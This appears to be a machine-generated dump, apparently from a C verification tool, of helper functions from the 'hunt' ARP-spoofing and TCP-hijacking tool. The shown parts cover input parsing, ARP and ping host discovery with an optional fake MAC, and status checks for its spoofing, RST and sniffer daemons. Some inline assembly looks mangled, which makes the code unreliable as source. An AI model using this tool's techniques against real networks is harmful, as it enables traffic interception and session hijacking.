  hent = (struct hostent *)(void *)0;
  signed int return_value___sigsetjmp_3;
  return_value___sigsetjmp_3=__sigsetjmp(jmp_hostbyname, 0);
  if(return_value___sigsetjmp_3 == 0)
  {
    ctrl_c_signaled = 0;
    sac.__sigaction_handler.sa_handler = ctrl_c_handler_link1;
    sigemptyset(&sac.sa_mask);
    sigaddset(&sac.sa_mask, 2);
    sac.sa_flags = 0x10000000;
    sigaction(2, &sac, &old_sac);
    hent=gethostbyname(buf);
    sigaction(2, &old_sac, (struct sigaction *)(void *)0);
  }

  else
  {
    hent = (struct hostent *)(void *)0;
    press_key("\n-- operation canceled - press any key> ");
    sigaction(2, &old_sac, (struct sigaction *)(void *)0);
    sigemptyset(&new_mask);
    sigaddset(&new_mask, 2);
    pthread_sigmask(1, &new_mask, (struct anonymous_3 *)(void *)0);
  }
  if(!(hent == ((struct hostent *)NULL)))
  {
    ip = *((unsigned int *)hent->h_addr_list[(signed long int)0]);
    return ip;
  }

  else
  {
    printf("can't resolve name %s to host address\n", buf);
    return (unsigned int)-1;
  }
}

// parse_mac
// file menu.c line 173
signed int parse_mac(char *buf, char *mac_ret)
{
  unsigned char mac[6l];
  char *p;
  char *tmp;
  char *buf_p;
  signed int count;
  signed int i;
  signed int err;
  buf_p = buf;
  count = 0;
  err = 0;
  signed int tmp_post_2;
  do
  {
    p=strtok(buf_p, ": \t\n");
    if(p == ((char *)NULL))
      break;

    if(count >= 6)
      break;

    buf_p = (char *)(void *)0;
    signed long int return_value_strtol_1;
    return_value_strtol_1=strtol(p, &tmp, 16);
    i = (signed int)return_value_strtol_1;
    if(!(*tmp == 0))
    {
      err = 1;
      break;
    }

    tmp_post_2 = count;
    count = count + 1;
    mac[(signed long int)tmp_post_2] = (unsigned char)i;
  }
  while((_Bool)1);
  if(!(count == 6))
    err = 1;

  if(err == 0)
  {
    memcpy((void *)mac_ret, (const void *)mac, (unsigned long int)6);
    return 0;
  }

  else
  {
    printf("bad mac address\n");
    return -1;
  }
}

// parse_ports
// file menu.c line 58
signed int parse_ports(char *buf, unsigned int *ret_ports)
{
  char *buf_p;
  char *p;
  char *d;
  char *tmp;
  signed int ports[17l];
  signed int err;
  signed int i;
  signed int count;
  buf_p = buf;
  err = 0;
  count = 0;
  _Bool tmp_if_expr_10;
  char *return_value___builtin_strchr_9;
  char *tmp_post_1;
  signed int tmp_post_4;
  signed int tmp_post_7;
  do
  {
    p=strtok(buf_p, " ,;\t\n");
    if(p == ((char *)NULL))
      break;

    buf_p = (char *)(void *)0;
    char *return_value___builtin_strchr_8;
    return_value___builtin_strchr_8=__builtin_strchr(p, 45);
    d = return_value___builtin_strchr_8;
    if(!(d == ((char *)NULL)))
      tmp_if_expr_10 = (_Bool)1;

    else
    {
      return_value___builtin_strchr_9=__builtin_strchr(p, 58);
      d = return_value___builtin_strchr_9;
      tmp_if_expr_10 = d != ((char *)NULL) ? (_Bool)1 : (_Bool)0;
    }
    if(tmp_if_expr_10)
    {
      tmp_post_1 = d;
      d = d + 1l;
      *tmp_post_1 = (char)0;
      signed long int return_value_strtol_2;
      return_value_strtol_2=strtol(p, &tmp, 10);
      i = (signed int)return_value_strtol_2;
      if(!(*tmp == 0))
      {
        err = 1;
        break;
      }

      ports[(signed long int)count] = i;
      ports[(signed long int)count] = ports[(signed long int)count] | 1 << 16;
      count = count + 1;
      signed long int return_value_strtol_3;
      return_value_strtol_3=strtol(d, &tmp, 10);
      i = (signed int)return_value_strtol_3;
      if(!(*tmp == 0))
      {
        err = 1;
        break;
      }

      tmp_post_4 = count;
      count = count + 1;
      ports[(signed long int)tmp_post_4] = i;
    }

    else
    {
      signed long int return_value_strtol_5;
      return_value_strtol_5=strtol(p, &tmp, 10);
      i = (signed int)return_value_strtol_5;
      if(!(*tmp == 0))
      {
        unsigned short int return_value_service_lookup_6;
        return_value_service_lookup_6=service_lookup(p);
        i = (signed int)return_value_service_lookup_6;
        if(i == 0)
        {
          err = 1;
          break;
        }

      }

      tmp_post_7 = count;
      count = count + 1;
      ports[(signed long int)tmp_post_7] = i;
    }
  }
  while((_Bool)1);
  signed int tmp_post_11 = count;
  count = count + 1;
  ports[(signed long int)tmp_post_11] = 0;
  if(count >= 18 || !(err == 0))
  {
    printf("bad ports\n");
    return -1;
  }

  else
  {
    memcpy((void *)ret_ports, (const void *)ports, sizeof(signed int) /*4ul*/  * (unsigned long int)count);
    return 0;
  }
}

// parse_unr
// file menu.c line 46
signed int parse_unr(char *buf, signed int min, signed int max)
{
  char *tmp;
  signed int i;
  signed long int return_value_strtol_1;
  return_value_strtol_1=strtol(buf, &tmp, 10);
  i = (signed int)return_value_strtol_1;
  _Bool tmp_if_expr_2;
  if(*tmp == 0)
    tmp_if_expr_2 = (_Bool)1;

  else
    tmp_if_expr_2 = (signed int)*tmp == 0x0a ? (_Bool)1 : (_Bool)0;
  if(i >= min && max >= i && tmp_if_expr_2)
    return i;

  else
    return -1;
}

// perform_arp
// file hostup.c line 139
static void perform_arp(struct host_up_info *hui, signed int count, signed int *up, unsigned char *fake_mac)
{
  union u_longchar tmp;
  signed int i;
  signed int j;
  signed int idx;
  unsigned int ip;
  unsigned int src_addr;
  struct arpeth_hdr *arpethh;
  struct timeval tv;
  struct timespec timeout;
  struct packet *p;
  printf("arp");
  fflush(stdout);
  j = 1;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  unsigned int return_value___bswap_32_3;
  void *return_value_list_consume_6;
  signed int return_value_memcmp_10;
  signed int return_value_memcmp_9;
  for( ; count >= j; j = j + 1)
  {
    ip = hui->start_addr;
    do
    {
      return_value___bswap_32_1=__bswap_32_link7(ip);
      return_value___bswap_32_2=__bswap_32_link7(hui->end_addr);
      if(!(return_value___bswap_32_2 >= return_value___bswap_32_1))
        break;

      unsigned int return_value___bswap_32_4;
      return_value___bswap_32_4=__bswap_32_link7(ip);
      unsigned int return_value___bswap_32_5;
      return_value___bswap_32_5=__bswap_32_link7(hui->start_addr);
      idx = (signed int)(return_value___bswap_32_4 - return_value___bswap_32_5);
      if(up[(signed long int)idx] == 0)
      {
        if(fake_mac == ((unsigned char *)NULL))
          send_arp_message(ip, (char *)mac_broadcast);

        else
          send_arp_message(ip, (char *)fake_mac);
      }

      return_value___bswap_32_3=__bswap_32_link7(ip);
      ip=__bswap_32_link7(return_value___bswap_32_3 + (unsigned int)1);
    }
    while((_Bool)1);
    gettimeofday(&tv, (struct timezone *)(void *)0);
    timeout.tv_sec = tv.tv_sec + (signed long int)2;
    timeout.tv_nsec = tv.tv_usec * (signed long int)1000;
    do
    {
      return_value_list_consume_6=list_consume(&l_arp_packet, &timeout);
      p = (struct packet *)return_value_list_consume_6;
      if(p == ((struct packet *)NULL))
        break;

      arpethh = (struct arpeth_hdr *)(p->p_arph + (signed long int)1);
      src_addr = *((unsigned int *)arpethh->ar_sip);
      signed int return_value_memcmp_11;
      return_value_memcmp_11=memcmp((const void *)arpethh->ar_sha, (const void *)p->p_ethh->h_source, (unsigned long int)6);
      if(return_value_memcmp_11 == 0)
      {
        return_value_memcmp_10=memcmp((const void *)my_eth_mac, (const void *)p->p_ethh->h_dest, (unsigned long int)6);
        if(return_value_memcmp_10 == 0)
        {
          return_value_memcmp_9=memcmp((const void *)my_eth_mac, (const void *)arpethh->ar_tha, (unsigned long int)6);
          if(return_value_memcmp_9 == 0)
          {
            i = 0;
            for( ; !(i >= 4); i = i + 1)
              tmp.buff[(signed long int)i] = (char)arpethh->ar_tip[(signed long int)i];
            if(tmp.val == (unsigned long int)my_eth_ip)
            {
              unsigned int return_value___bswap_32_7;
              return_value___bswap_32_7=__bswap_32_link7(src_addr);
              unsigned int return_value___bswap_32_8;
              return_value___bswap_32_8=__bswap_32_link7(hui->start_addr);
              idx = (signed int)(return_value___bswap_32_7 - return_value___bswap_32_8);
              up[(signed long int)idx] = 1;
              host_lookup(src_addr, 1);
            }

          }

        }

      }

      packet_free(p);
    }
    while((_Bool)1);
    printf(".");
    fflush(stdout);
  }
  printf("\n");
}

// perform_ping
// file hostup.c line 66
static void perform_ping(struct host_up_info *hui, signed int count, signed int *up, unsigned char *fake_mac)
{
  struct mac_info *m;
  struct packet *p;
  struct timeval tv;
  struct timespec timeout;
  unsigned int ip;
  unsigned int src_addr;
  unsigned int idx;
  signed int j;
  printf("ping");
  fflush(stdout);
  j = 1;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  unsigned short int tmp_statement_expression_6;
  unsigned short int tmp_statement_expression_7;
  unsigned int return_value___bswap_32_3;
  void *return_value_list_consume_8;
  _Bool tmp_if_expr_14;
  _Bool tmp_if_expr_13;
  signed int return_value_is_icmp_reply_12;
  for( ; count >= j; j = j + 1)
  {
    ip = hui->start_addr;
    do
    {
      return_value___bswap_32_1=__bswap_32_link7(ip);
      return_value___bswap_32_2=__bswap_32_link7(hui->end_addr);
      if(!(return_value___bswap_32_2 >= return_value___bswap_32_1))
        break;

      unsigned int return_value___bswap_32_4;
      return_value___bswap_32_4=__bswap_32_link7(ip);
      unsigned int return_value___bswap_32_5;
      return_value___bswap_32_5=__bswap_32_link7(hui->start_addr);
      idx = return_value___bswap_32_4 - return_value___bswap_32_5;
      if(up[(signed long int)idx] == 0)
      {
        if(fake_mac == ((unsigned char *)NULL))
        {
          m=mac_info_get(ip);
          if(!(m == ((struct mac_info *)NULL)))
          {
            unsigned short int __v;
            unsigned short int __x = (unsigned short int)(j + 2000);
            asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
            tmp_statement_expression_6 = __v;
            send_icmp_request(my_eth_ip, ip, (char *)my_eth_mac, m->mac, tmp_statement_expression_6);
            mac_info_release(m);
          }

        }

        else
        {
          unsigned short int perform_ping__1__1__1__1__2__1____v;
          unsigned short int perform_ping__1__1__1__1__2__1____x = (unsigned short int)(j + 2000);
          asm("rorw _8, %w0" : "=r"(perform_ping__1__1__1__1__2__1____v) : "0"(perform_ping__1__1__1__1__2__1____x) : "cc");
          tmp_statement_expression_7 = perform_ping__1__1__1__1__2__1____v;
          send_icmp_request(my_eth_ip, ip, (char *)my_eth_mac, (char *)fake_mac, tmp_statement_expression_7);
        }
      }

      return_value___bswap_32_3=__bswap_32_link7(ip);
      ip=__bswap_32_link7(return_value___bswap_32_3 + (unsigned int)1);
    }
    while((_Bool)1);
    gettimeofday(&tv, (struct timezone *)(void *)0);
    timeout.tv_sec = tv.tv_sec + (signed long int)2;
    timeout.tv_nsec = tv.tv_usec * (signed long int)1000;
    do
    {
      return_value_list_consume_8=list_consume(&l_icmp_packet, &timeout);
      p = (struct packet *)return_value_list_consume_8;
      if(p == ((struct packet *)NULL))
        break;

      src_addr = p->p_iph->saddr;
      signed int return_value_is_icmp_reply_11;
      return_value_is_icmp_reply_11=is_icmp_reply(p, src_addr, my_eth_ip, (char *)p->p_ethh->h_source, (char *)my_eth_mac);
      if(!(return_value_is_icmp_reply_11 == 0))
        tmp_if_expr_14 = (_Bool)1;

      else
      {
        if(!(fake_mac == ((unsigned char *)NULL)))
        {
          return_value_is_icmp_reply_12=is_icmp_reply(p, src_addr, my_eth_ip, (char *)fake_mac, (char *)my_eth_mac);
          tmp_if_expr_13 = return_value_is_icmp_reply_12 != 0 ? (_Bool)1 : (_Bool)0;
        }

        else
          tmp_if_expr_13 = (_Bool)0;
        tmp_if_expr_14 = tmp_if_expr_13 ? (_Bool)1 : (_Bool)0;
      }
      if(tmp_if_expr_14)
      {
        unsigned int return_value___bswap_32_9;
        return_value___bswap_32_9=__bswap_32_link7(src_addr);
        unsigned int return_value___bswap_32_10;
        return_value___bswap_32_10=__bswap_32_link7(hui->start_addr);
        idx = return_value___bswap_32_9 - return_value___bswap_32_10;
        up[(signed long int)idx] = 1;
        host_lookup(src_addr, 1);
      }

      packet_free(p);
    }
    while((_Bool)1);
    printf(".");
    fflush(stdout);
  }
  printf("\n");
}

// port_htons
// file util.c line 334
void port_htons(unsigned int *db_ports)
{
  signed int i;
  unsigned int upper;
  i = 0;
  unsigned short int tmp_statement_expression_1;
  for( ; !(db_ports[(signed long int)i] == 0u); i = i + 1)
  {
    upper = db_ports[(signed long int)i] & ~0xFFFFU;
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)(db_ports[(signed long int)i] & 0xFFFFU);
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_1 = __v;
    db_ports[(signed long int)i] = upper | (unsigned int)tmp_statement_expression_1;
  }
}

// port_lookup
// file hunt.h line 453
char * port_lookup(unsigned short int serv, signed int use_mode)
{
  char name_buf[64l];
  char *name;
  char *retval;
  signed int len;
  struct servent *serv_ent;
  unsigned short int tmp_statement_expression_1;
  if((signed int)serv == 0)
    return "0";

  else
  {
    if(!(use_mode == 1) && !(use_mode == 2))
    {
      if(use_mode == 0)
        goto __CPROVER_DUMP_L4;

    }

    else
    {
      serv_ent=getservbyport((signed int)serv, "tcp");
      if(!(serv_ent == ((struct servent *)NULL)))
      {
        name = serv_ent->s_name;
        goto __CPROVER_DUMP_L7;
      }

    }

  __CPROVER_DUMP_L4:
    ;
    name = name_buf;
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)serv;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_1 = __v;
    sprintf(name, "%d", tmp_statement_expression_1);

  __CPROVER_DUMP_L7:
    ;
    unsigned long int return_value_strlen_2;
    return_value_strlen_2=strlen(name);
    len = (signed int)return_value_strlen_2;
    static signed int servname_idx = 0;
    if((unsigned long int)(1 + len + servname_idx) >= 513ul)
      servname_idx = 0;

    static char servname_buf[512l] = { (char)0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
    retval = servname_buf + (signed long int)servname_idx;
    strcpy(retval, name);
    servname_idx = servname_idx + len + 1;
    return retval;
  }
}

// port_match
// file util.c line 306
signed int port_match(signed int port, unsigned int *db_ports)
{
  signed int start;
  signed int end;
  signed int pass;
  signed int i;
  unsigned short int tmp_statement_expression_1;
  unsigned short int tmp_statement_expression_2;
  unsigned short int tmp_statement_expression_4;
  unsigned short int tmp_statement_expression_3;
  if(*db_ports == 0u)
    return 1;

  else
  {
    pass = 0;
    i = 0;
    for( ; !(db_ports[(signed long int)i] == 0u); i = i + 1)
      if(!((65536u & db_ports[(signed long int)i]) == 0u))
      {
        unsigned short int __v;
        unsigned short int __x = (unsigned short int)(db_ports[(signed long int)i] & 0xFFFFU);
        asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
        tmp_statement_expression_1 = __v;
        start = (signed int)tmp_statement_expression_1;
        unsigned short int port_match__1__1__1__2____v;
        unsigned short int port_match__1__1__1__2____x;
        i = i + 1;
        port_match__1__1__1__2____x = (unsigned short int)db_ports[(signed long int)i];
        asm("rorw _8, %w0" : "=r"(port_match__1__1__1__2____v) : "0"(port_match__1__1__1__2____x) : "cc");
        tmp_statement_expression_2 = port_match__1__1__1__2____v;
        end = (signed int)tmp_statement_expression_2;
        unsigned short int port_match__1__1__1__3____v;
        unsigned short int port_match__1__1__1__3____x = (unsigned short int)port;
        asm("rorw _8, %w0" : "=r"(port_match__1__1__1__3____v) : "0"(port_match__1__1__1__3____x) : "cc");
        tmp_statement_expression_4 = port_match__1__1__1__3____v;
        if((signed int)tmp_statement_expression_4 >= start)
        {
          unsigned short int port_match__1__1__1__4____v;
          unsigned short int port_match__1__1__1__4____x = (unsigned short int)port;
          asm("rorw _8, %w0" : "=r"(port_match__1__1__1__4____v) : "0"(port_match__1__1__1__4____x) : "cc");
          tmp_statement_expression_3 = port_match__1__1__1__4____v;
          if(end >= (signed int)tmp_statement_expression_3)
          {
            pass = 1;
            break;
          }

        }

      }

      else
        if((unsigned int)port == db_ports[(signed long int)i])
        {
          pass = 1;
          break;
        }

    if(!(pass == 0))
      return 1;

    else
      return 0;
  }
}

// press_key
// file hunt.h line 362
void press_key(char *label)
{
  if(label == ((char *)NULL))
    label = "";

  set_tty_color((enum TTY_COLOR)COLOR_WHITE);
  printf("%s", label);
  fflush(stdout);
  getchar_link1();
  set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
}

// print_arp_relayer_daemon
// file hunt.h line 527
void print_arp_relayer_daemon(void)
{
  if(!(relayer_running == 0))
  {
    signed int return_value_pthread_kill_1;
    return_value_pthread_kill_1=pthread_kill(relay_thr, 0);
    if(!(return_value_pthread_kill_1 == 0))
    {
      pthread_join(relay_thr, (void **)(void *)0);
      relay_thr = (unsigned long int)0;
      relayer_running = 0;
      set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
      printf("ARP relayer daemon failed - bug\n");
      set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
    }

    else
      printf("Y");
  }

}

// print_cntrl_chars_setup
// file options.c line 180
static void print_cntrl_chars_setup(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("print cntrl chars", "yn", (char)121);
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      print_cntrl_chars = 1;
      break;
    }
    case 110:
      print_cntrl_chars = 0;
  }
}

// print_colors
// file util.c line 42
void print_colors()
{
  signed int i = 0;
  for( ; !(i >= 16); i = i + 1)
  {
    set_tty_color((enum TTY_COLOR)i);
    printf("%d Hi\n", i);
  }
}

// print_data
// file util.c line 154
void print_data(char *label, void *data, signed int len)
{
  signed int i;
  printf("%s: ", label);
  i = 0;
  for( ; !(i >= len); i = i + 1)
    printf("%X ", ((unsigned char *)data)[(signed long int)i]);
  printf("\n");
}

// print_data_packet
// file hunt.h line 414
void print_data_packet(struct packet *p, signed int data_len, signed int count, signed int dst_packet)
{
  signed int data_start;
  signed int i;
  data_start = 0;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  static unsigned int hsrc_seq_done;
  static unsigned int hdst_seq_done;
  if(count >= 2)
  {
    if(!(dst_packet == 0))
    {
      return_value___bswap_32_1=__bswap_32_link1(p->p_hdr.p_tcph->_anon0._anon1.seq);
      data_start = (signed int)(hdst_seq_done - return_value___bswap_32_1);
    }

    else
    {
      return_value___bswap_32_2=__bswap_32_link1(p->p_hdr.p_tcph->_anon0._anon1.seq);
      data_start = (signed int)(hsrc_seq_done - return_value___bswap_32_2);
    }
    if(!(data_start >= 0))
      data_start = 0;

  }

  if(dst_packet == 0)
    set_tty_color((enum TTY_COLOR)COLOR_GREEN);

  i = data_start;
  _Bool tmp_if_expr_10;
  _Bool tmp_if_expr_5;
  const unsigned short int **return_value___ctype_b_loc_4;
  _Bool tmp_if_expr_9;
  _Bool tmp_if_expr_8;
  const unsigned short int **return_value___ctype_b_loc_6;
  _Bool tmp_if_expr_7;
  for( ; !(i >= data_len); i = i + 1)
  {
    if((signed int)p->p_data[(signed long int)i] == 13 && !(1 + i >= data_len))
      tmp_if_expr_10 = (signed int)p->p_data[(signed long int)(i + 1)] != 10 ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_10 = (_Bool)0;
    if(tmp_if_expr_10)
      putchar(10);

    else
    {
      const unsigned short int **return_value___ctype_b_loc_3;
      return_value___ctype_b_loc_3=__ctype_b_loc();
      if(!((16384 & (signed int)(*return_value___ctype_b_loc_3)[(signed long int)(signed int)p->p_data[(signed long int)i]]) == 0))
        tmp_if_expr_5 = (_Bool)1;

      else
      {
        return_value___ctype_b_loc_4=__ctype_b_loc();
        tmp_if_expr_5 = ((signed int)(*return_value___ctype_b_loc_4)[(signed long int)(signed int)p->p_data[(signed long int)i]] & (signed int)(unsigned short int)8192) != 0 ? (_Bool)1 : (_Bool)0;
      }
      if(tmp_if_expr_5)
        tmp_if_expr_9 = (_Bool)1;

      else
      {
        if(!(print_cntrl_chars == 0))
        {
          return_value___ctype_b_loc_6=__ctype_b_loc();
          if(!((2 & (signed int)(*return_value___ctype_b_loc_6)[(signed long int)(signed int)p->p_data[(signed long int)i]]) == 0))
            tmp_if_expr_7 = (_Bool)1;

          else
            tmp_if_expr_7 = (signed int)p->p_data[(signed long int)i] == 033 ? (_Bool)1 : (_Bool)0;
          tmp_if_expr_8 = tmp_if_expr_7 ? (_Bool)1 : (_Bool)0;
        }

        else
          tmp_if_expr_8 = (_Bool)0;
        tmp_if_expr_9 = tmp_if_expr_8 ? (_Bool)1 : (_Bool)0;
      }
      if(tmp_if_expr_9)
        putchar((signed int)p->p_data[(signed long int)i]);

      else
        printf("<%X>", (unsigned int)(unsigned char)p->p_data[(signed long int)i]);
    }
  }
  if(dst_packet == 0)
    set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);

  fflush(stdout);
  unsigned int return_value___bswap_32_11;
  unsigned int return_value___bswap_32_12;
  if(data_len >= data_start && !(count == 0))
  {
    if(!(dst_packet == 0))
    {
      return_value___bswap_32_11=__bswap_32_link1(p->p_hdr.p_tcph->_anon0._anon1.seq);
      hdst_seq_done = return_value___bswap_32_11 + (unsigned int)data_len;
    }

    else
    {
      return_value___bswap_32_12=__bswap_32_link1(p->p_hdr.p_tcph->_anon0._anon1.seq);
      hsrc_seq_done = return_value___bswap_32_12 + (unsigned int)data_len;
    }
  }

}

// print_eth_mac
// file util.c line 229
signed int print_eth_mac(unsigned char *mac)
{
  char buf[64l];
  sprintf_eth_mac(buf, mac);
  signed int return_value_printf_1 = printf("%s", (const void *)buf);
  return return_value_printf_1;
}

// print_host_properties
// file options.c line 59
static void print_host_properties(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("Resolve host names", "yn", (char)(hl_mode == 0 ? 110 : 121));
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      hl_mode = 1;
      break;
    }
    case 110:
      hl_mode = 0;
  }
}

// print_mac_daemon
// file hunt.h line 578
void print_mac_daemon()
{
  if(!(thr_running == 0))
  {
    signed int return_value_pthread_kill_1;
    return_value_pthread_kill_1=pthread_kill(mac_thr, 0);
    if(!(return_value_pthread_kill_1 == 0))
    {
      pthread_join(mac_thr, (void **)(void *)0);
      mac_thr = (unsigned long int)0;
      thr_running = 0;
      set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
      printf("MAC daemon failed - bug\n");
      set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
    }

    else
      printf("M");
  }

}

// print_mac_table
// file hunt.c line 1005
void print_mac_table(void)
{
  struct hash_iterator hi;
  char buf[512l];
  unsigned int key;
  struct mac_info *mi;
  signed int i = 0;
  printf("--- mac table ---\n");
  hash_iter_set(&hi, &mac_table);
  void *return_value_hash_iter_get_1;
  do
  {
    return_value_hash_iter_get_1=hash_iter_get(&hi, &key);
    mi = (struct mac_info *)return_value_hash_iter_get_1;
    if(mi == ((struct mac_info *)NULL))
      break;

    sprintf_eth_mac(buf, (unsigned char *)mi->mac);
    char *return_value_host_lookup_2;
    return_value_host_lookup_2=host_lookup(key, hl_mode);
    printf("%-24s %s\n", return_value_host_lookup_2, (const void *)buf);
    i = i + 1;
    if(i % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  hash_iter_end(&hi);
}

// print_new_conn_ind
// file hunt.h line 375
void print_new_conn_ind(signed int add_new)
{
  pthread_mutex_lock(&menucc_mutex);
  if(!(add_new == 0))
    menucc_conn_s = menucc_conn_s + 1;

  static signed int last = 0;
  if(!(menucc_in_menu == 0) && (menucc_conn_ind == 0 || last == 0 || add_new == 0))
  {
    if(!(menucc_conn_ind == 0))
    {
      putchar_link1(13);
      if(!(menucc_conn_s == menucc_conn_s_old))
      {
        putchar_link1(42);
        last = 1;
      }

      else
      {
        putchar_link1(45);
        last = 0;
      }
    }

    if(!(menucc_dfl == 0))
    {
      unsigned long int return_value_strlen_1;
      return_value_strlen_1=strlen(menucc_label);
      if(!(return_value_strlen_1 == 0ul))
        printf("%s [%c]> ", menucc_label, menucc_dfl);

      else
        printf("[%c]> ", menucc_dfl);
    }

    else
      printf("%s> ", menucc_label);
    fflush(stdout);
  }

  pthread_mutex_unlock(&menucc_mutex);
}

// print_relay_packet
// file arpspoof.c line 668
static void print_relay_packet(const char *label, struct packet *p, signed int print_mac)
{
  ;
}

// print_rst_daemon
// file hunt.h line 563
void print_rst_daemon(void)
{
  if(!(rstd_running == 0))
  {
    signed int return_value_pthread_kill_1;
    return_value_pthread_kill_1=pthread_kill(rstd_thr, 0);
    if(!(return_value_pthread_kill_1 == 0))
    {
      pthread_join(rstd_thr, (void **)(void *)0);
      rstd_thr = (unsigned long int)0;
      rstd_running = 0;
      set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
      printf("RST daemon failed - bug\n");
      set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
    }

    else
      printf("R");
  }

}

// print_sniff_daemon
// file hunt.h line 570
void print_sniff_daemon(void)
{
  if(!(sniffer_running == 0))
  {
    signed int return_value_pthread_kill_1;
    return_value_pthread_kill_1=pthread_kill(sniff_thr, 0);
    if(!(return_value_pthread_kill_1 == 0))
    {
      pthread_join(sniff_thr, (void **)(void *)0);
      sniff_thr = (unsigned long int)0;
      sniffer_running = 0;
      set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
      printf("Sniffer daemon failed - bug\n");
      set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
    }

    else
      printf("S");
  }

}

// print_tcp
// file hunt.c line 903
void print_tcp(struct packet *p, struct iphdr *ip, struct tcphdr *tcp)
{
  char *return_value_host_lookup_1;
  return_value_host_lookup_1=host_lookup(ip->saddr, hl_mode);
  unsigned short int tmp_statement_expression_2;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)tcp->_anon0._anon1.source;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_2 = __v;
  unsigned int return_value___bswap_32_3;
  return_value___bswap_32_3=__bswap_32(tcp->_anon0._anon1.seq);
  unsigned int tmp_if_expr_5;
  unsigned int return_value___bswap_32_4;
  if(!(tcp->_anon0._anon1.ack == 0))
  {
    return_value___bswap_32_4=__bswap_32(tcp->_anon0._anon1.ack_seq);
    tmp_if_expr_5 = (unsigned int)return_value___bswap_32_4;
  }

  else
    tmp_if_expr_5 = (unsigned int)0;
  char *return_value_host_lookup_6;
  return_value_host_lookup_6=host_lookup(ip->daddr, hl_mode);
  unsigned short int tmp_statement_expression_7;
  unsigned short int print_tcp__1__2____v;
  unsigned short int print_tcp__1__2____x = (unsigned short int)tcp->_anon0._anon1.dest;
  asm("rorw _8, %w0" : "=r"(print_tcp__1__2____v) : "0"(print_tcp__1__2____x) : "cc");
  tmp_statement_expression_7 = print_tcp__1__2____v;
